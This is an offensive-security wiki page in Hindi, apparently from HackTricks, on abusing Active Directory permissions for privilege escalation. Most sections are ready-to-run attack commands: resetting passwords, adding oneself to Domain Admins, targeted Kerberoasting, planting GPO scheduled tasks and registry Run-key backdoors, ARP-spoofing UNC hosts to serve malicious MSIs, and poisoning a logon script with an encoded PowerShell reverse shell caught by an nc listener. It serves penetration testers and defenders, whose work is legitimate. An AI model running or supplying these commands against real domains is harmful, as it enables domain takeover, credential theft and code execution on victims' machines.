# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्य रूप से इन techniques के सारांश पर आधारित है:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**। अधिक details के लिए, original articles देखें।**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User पर GenericAll Rights**

यह privilege attacker को target user account पर पूर्ण control देता है। `Get-ObjectAcl` command का उपयोग करके `GenericAll` rights की पुष्टि हो जाने के बाद, attacker यह कर सकता है:

- **Target का Password बदलना**: `net user <username> <password> /domain` का उपयोग करके attacker user का password reset कर सकता है।
- Linux से, Samba `net rpc` के साथ SAMR पर भी यही किया जा सकता है:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **यदि account disabled है, तो UAC flag clear करें**: `GenericAll` `userAccountControl` को edit करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag को हटा सकता है:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: user's account को एक SPN assign करें ताकि वह kerberoastable बन जाए, फिर TGT hashes को extract करने और उन्हें crack करने का प्रयास करने के लिए Rubeus और targetedKerberoast.py का उपयोग करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: user के लिए pre-authentication disable करें, जिससे उनका account ASREPRoasting के प्रति vulnerable हो जाता है।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` होने पर आप certificate-based credential जोड़ सकते हैं और उनका password बदले बिना उनके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll अधिकार**

यह privilege attacker को group memberships में बदलाव करने की अनुमति देता है, यदि उनके पास `Domain Admins` जैसे किसी group पर `GenericAll` rights हों। `Get-NetGroup` से group का distinguished name पहचानने के बाद, attacker यह कर सकता है:

- **स्वयं को Domain Admins Group में जोड़ना**: यह direct commands के माध्यम से या Active Directory अथवा PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux से आप BloodyAD का उपयोग करके स्वयं को arbitrary groups में भी जोड़ सकते हैं, जब आपके पास उन पर GenericAll/Write membership हो। यदि target group “Remote Management Users” में nested है, तो आपको उस group को मान्यता देने वाले hosts पर तुरंत WinRM access मिल जाएगा:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से निम्न कार्य संभव होते हैं:

- **Kerberos Resource-based Constrained Delegation**: किसी computer object पर takeover सक्षम करता है।
- **Shadow Credentials**: shadow credentials बनाने के privileges का दुरुपयोग करके किसी computer या user account का impersonation करने के लिए इस technique का उपयोग करें।

## **WriteProperty on Group**

यदि किसी user के पास किसी specific group (जैसे, `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वह:

- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को मिलाकर यह domain के भीतर privilege escalation की अनुमति देता है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group पर Self (Self-Membership)**

यह privilege attackers को `Domain Admins` जैसे specific groups में स्वयं को add करने में सक्षम बनाता है, ऐसे commands के माध्यम से जो सीधे group membership को manipulate करते हैं। निम्नलिखित command sequence का उपयोग करके self-addition की जा सकती है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान privilege, यह attackers को groups की properties को modify करके सीधे स्वयं को groups में जोड़ने की अनुमति देता है, यदि उनके पास उन groups पर `WriteProperty` right हो। इस privilege की confirmation और execution निम्नलिखित के साथ की जाती है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` रखने से वर्तमान password जाने बिना password reset किया जा सकता है। इस right का verification और इसका exploitation PowerShell या वैकल्पिक command-line tools के माध्यम से किया जा सकता है, जिससे user का password reset करने के कई तरीके मिलते हैं, जिनमें interactive sessions और non-interactive environments के लिए one-liners शामिल हैं। Commands साधारण PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक होती हैं, जो attack vectors की versatility प्रदर्शित करती हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group पर WriteOwner**

यदि किसी attacker को किसी group पर `WriteOwner` rights प्राप्त हैं, तो वह group का ownership बदलकर उसे अपने नाम कर सकता है। यह विशेष रूप से तब प्रभावशाली होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group attributes और membership पर अधिक व्यापक control प्राप्त हो जाता है। इस process में `Get-ObjectAcl` का उपयोग करके सही object की पहचान की जाती है और फिर `Set-DomainObjectOwner` का उपयोग करके owner को SID या name के आधार पर बदला जाता है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **User पर GenericWrite**

यह permission attacker को user properties modify करने की अनुमति देती है। विशेष रूप से, `GenericWrite` access के साथ attacker user के logon script path को बदलकर user logon के समय malicious script execute कर सकता है। यह `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को attacker की script की ओर point करने के लिए update करके किया जाता है।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Group पर GenericWrite**

इस privilege के साथ, attackers group membership में बदलाव कर सकते हैं, जैसे स्वयं को या अन्य users को specific groups में जोड़ना। इस प्रक्रिया में credential object बनाना, उसका उपयोग करके किसी group से users को जोड़ना या हटाना, और PowerShell commands से membership में हुए बदलावों की पुष्टि करना शामिल है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux से, Samba `net` group में members को add/remove कर सकता है जब आपके पास group पर `GenericWrite` हो (PowerShell/RSAT उपलब्ध न होने पर उपयोगी):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

किसी AD object का स्वामी होना और उस पर `WriteDACL` privileges होना attacker को object पर `GenericAll` privileges स्वयं को प्रदान करने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जिससे object पर full control प्राप्त होता है और उसकी group memberships को modify करने की क्षमता मिलती है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges का exploit करने का प्रयास करते समय कुछ limitations मौजूद रहती हैं।<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

जब आपके पास किसी user या service account पर `WriteOwner` और `WriteDacl` permissions हों, तो आप full control ले सकते हैं और पुराने password को जाने बिना PowerView का उपयोग करके उसका password reset कर सकते हैं:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
नोट्स:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को स्वयं में बदलना पड़ सकता है:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Password reset के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।

## **Domain पर Replication (DCSync)**

DCSync attack domain पर मौजूद specific replication permissions का लाभ उठाकर Domain Controller का रूप धारण करता है और user credentials सहित data synchronize करता है। इस शक्तिशाली technique के लिए `DS-Replication-Get-Changes` जैसी permissions आवश्यक होती हैं, जिससे attackers Domain Controller तक direct access के बिना AD environment से sensitive information extract कर सकते हैं।<sup>[[5]](#references)</sup> [**DCSync attack के बारे में यहाँ अधिक जानें।**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access महत्वपूर्ण security risks उत्पन्न कर सकता है। उदाहरण के लिए, यदि `offense\spotless` जैसे user को GPO management rights delegated किए गए हैं, तो उनके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges हो सकती हैं। इन permissions का malicious purposes के लिए abuse किया जा सकता है, जैसा कि PowerView का उपयोग करके पहचाना गया है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Misconfigured GPOs की पहचान करने के लिए PowerSploit के cmdlets को एक साथ chain किया जा सकता है। इससे उन GPOs का पता लगाया जा सकता है जिन्हें किसी specific user के पास manage करने की permissions हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**किसी Given Policy को Applied Computers**: यह resolve करना संभव है कि कोई specific GPO किन computers पर लागू होता है, जिससे potential impact के scope को समझने में सहायता मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी Given Computer पर Applied Policies**: किसी particular computer पर कौन-सी policies लागू हैं, यह देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**किसी Given Policy वाले OUs**: किसी given policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप GPOs को enumerate करने और उनमें मौजूद issues खोजने के लिए [**GPOHound**](https://github.com/cogiceo/GPOHound) tool का भी उपयोग कर सकते हैं।

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs का code execute करने के लिए exploitation किया जा सकता है, उदाहरण के लिए, immediate scheduled task बनाकर। इसका उपयोग affected machines पर किसी user को local administrators group में add करने के लिए किया जा सकता है, जिससे privileges में महत्वपूर्ण वृद्धि होती है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - GPO का दुरुपयोग

यदि GroupPolicy module इंस्टॉल है, तो यह नए GPOs बनाने और उन्हें लिंक करने तथा प्रभावित कंप्यूटरों पर backdoors निष्पादित करने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। इस method के लिए GPO को अपडेट करना और execution के लिए किसी user का कंप्यूटर पर लॉग इन करना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse, नए GPOs बनाने की आवश्यकता के बिना tasks जोड़कर या settings modify करके मौजूदा GPOs का abuse करने की एक method प्रदान करता है। इस tool के लिए changes लागू करने से पहले मौजूदा GPOs को modify करना या नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates आमतौर पर हर 90 मिनट के आसपास होते हैं। इस प्रक्रिया को तेज करने के लिए, विशेष रूप से कोई बदलाव लागू करने के बाद, target computer पर `gpupdate /force` command का उपयोग करके तुरंत policy update force किया जा सकता है। यह command सुनिश्चित करती है कि GPOs में किए गए सभी modifications अगले automatic update cycle की प्रतीक्षा किए बिना लागू हो जाएं।

### Under the Hood

किसी दिए गए GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की जांच करने पर `evilTask` जैसे tasks के जुड़ने की पुष्टि की जा सकती है। ये tasks system behavior को modify करने या privileges escalate करने के उद्देश्य से scripts या command-line tools के माध्यम से बनाए जाते हैं।

`New-GPOImmediateTask` द्वारा generate की गई XML configuration file में दिखाया गया task structure scheduled task की specifics, जिसमें execute की जाने वाली command और उसके triggers शामिल हैं, को निर्धारित करता है। यह file दर्शाती है कि GPOs के भीतर scheduled tasks किस प्रकार define और manage किए जाते हैं, और policy enforcement के हिस्से के रूप में arbitrary commands या scripts execute करने की method प्रदान करती है।

### Users and Groups

GPOs target systems पर user और group memberships में manipulation की भी अनुमति देते हैं। Users and Groups policy files को सीधे edit करके attackers users को privileged groups, जैसे local `administrators` group, में add कर सकते हैं। यह GPO management permissions के delegation के माध्यम से संभव है, जो नए users को शामिल करने या group memberships बदलने के लिए policy files में modification की अनुमति देता है।

Users and Groups की XML configuration file बताती है कि ये changes किस प्रकार implement किए जाते हैं। इस file में entries add करके specific users को प्रभावित systems पर elevated privileges दिए जा सकते हैं। यह method GPO manipulation के माध्यम से privilege escalation का direct approach प्रदान करती है।

इसके अतिरिक्त, code execute करने या persistence बनाए रखने के लिए अन्य methods, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys को modify करना, `.msi` files के माध्यम से software install करना, या service configurations को edit करना, भी विचार किए जा सकते हैं। ये techniques GPOs के abuse के माध्यम से access बनाए रखने और target systems को control करने के विभिन्न तरीके प्रदान करती हैं।

### WriteGPLink + UNC path hijacking (ARP spoofing)

किसी OU/domain पर `WriteGPLink` आपको target container के `gPLink` attribute को modify करने और GPO को स्वयं edit किए बिना **किसी existing GPO को apply करने के लिए force** करने देता है। यह तब interesting हो जाता है जब linked GPO पहले से **UNC paths** (`\\HOST\share\...`) के माध्यम से remote content को reference करता हो, क्योंकि authenticated users **SYSVOL** को read कर सकते हैं और offline reusable policies की तलाश कर सकते हैं।<sup>[[11]](#references)</sup>

High-level workflow:

1. BloodHound का उपयोग करके ऐसे principal की पहचान करें जिसके पास किसी OU पर `WriteGPLink` हो, और उस OU के अंदर computers/users को enumerate करें।
2. `SYSVOL` को read-only clone करें और उन GPOs को खोजने के लिए parse करें जिनमें **Software Installation**, **drive mappings** (`Drives.xml`), और UNC paths को reference करने वाली **logon/startup scripts** हों।
3. उन policies को प्राथमिकता दें जो DFS/domain-namespace paths के बजाय **direct hostname** (उदाहरण के लिए `\\DC02\share\pkg.msi`) की ओर point करती हों, क्योंकि hostname-based paths को L2 spoofing के माध्यम से redirect करना आसान होता है।
4. चुने गए GPO GUID को target OU के `gPLink` में append करें, ताकि victim उस पहले से मौजूद policy को process करे।
5. उसी broadcast domain पर UNC host को ARP spoof करें और उसका IP locally bind करें (`ip addr add <target_ip>/32 dev <iface>`), ताकि victim का SMB traffic आपके host तक पहुंचे।
6. किसी attacker SMB server (उदाहरण के लिए `smbserver.py`) से expected path/filename serve करें और normal policy processing की प्रतीक्षा करें।

Example `SYSVOL` collection and GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
मौजूदा GPO को target OU से link करें:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

यदि linked GPO किसी UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करेगा और **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। Referenced host को spoof करके और **same share/path/name** के अंतर्गत malicious MSI serve करके, आप **SYSVOL को modify किए बिना** `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

Important constraints:

- **Timing matters**: नया link policy refresh पर दिखाई देता है (आमतौर पर ~90 मिनट), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
- Windows Installer आमतौर पर deployment को package **`ProductCode`** का उपयोग करके track करता है। यदि product पहले से installed है, तो deployment skip किया जा सकता है।
- Installer rejection से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`** GPO द्वारा expected legitimate package से match करे।
- पुरानी `.aas` advertisement files `SYSVOL` में बनी रह सकती हैं, इसलिए इस पर निर्भर करने से पहले validate करें कि deployment अभी भी active दिखाई दे रहा है।
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` में GPP drive mappings के कारण users logon या reconnection के दौरान configured UNC path से authenticate करते हैं। यदि आप referenced host को spoof करते हैं, तो **NetNTLMv2** capture कर सकते हैं। यदि SMB को जानबूझकर fail कराया जाए, तो Windows **WebDAV** पर retry कर सकता है और **NTLM over HTTP** भेजता है, जो **LDAP(S)**, **AD CS**, या **SMB** के लिए relays में कहीं अधिक flexible है।

#### Logon/startup script UNC hijack

यही pattern `SYSVOL` में discover की गई UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होती हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होती हैं।

यदि script path किसी spoofable hostname की ओर point करता है, तो UNC host को redirect करें और expected location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के अंतर्गत writable paths, GPO के माध्यम से user logon पर execute होने वाली logon scripts में tampering की अनुमति देते हैं। इससे logging users के security context में code execution प्राप्त होता है।

### Locate logon scripts
- Configured logon script के लिए user attributes inspect करें:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- scripts के shortcuts या references खोजने के लिए domain shares को crawl करें:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` files को Parse करके SYSVOL/NETLOGON की ओर संकेत करने वाले targets का पता लगाएँ (यह उपयोगी DFIR trick है और उन attackers के लिए भी, जिनके पास direct GPO access नहीं है):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound user nodes पर मौजूद होने पर `logonScript` (scriptPath) attribute प्रदर्शित करता है।

### Write access validate करें (share listings पर भरोसा न करें)
Automated tooling SYSVOL/NETLOGON को read-only दिखा सकती है, लेकिन underlying NTFS ACLs फिर भी writes की अनुमति दे सकते हैं। हमेशा test करें:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
यदि file size या mtime बदलता है, तो आपके पास write access है। संशोधित करने से पहले originals सुरक्षित रखें।

### RCE के लिए VBScript logon script को Poison करें
एक command append करें जो PowerShell reverse shell लॉन्च करे (revshells.com से generate करें) और business function को न तोड़ने के लिए original logic बनाए रखें:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
अपने host पर listen करें और अगले interactive logon की प्रतीक्षा करें:
```bash
rlwrap -cAr nc -lnvp 443
```
नोट्स:
- Execution logging user के token के अंतर्गत होता है (SYSTEM के अंतर्गत नहीं)। Scope उस GPO link (OU, site, domain) का होता है जो उस script को लागू करता है।
- उपयोग के बाद original content/timestamps को restore करके cleanup करें।


## References

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
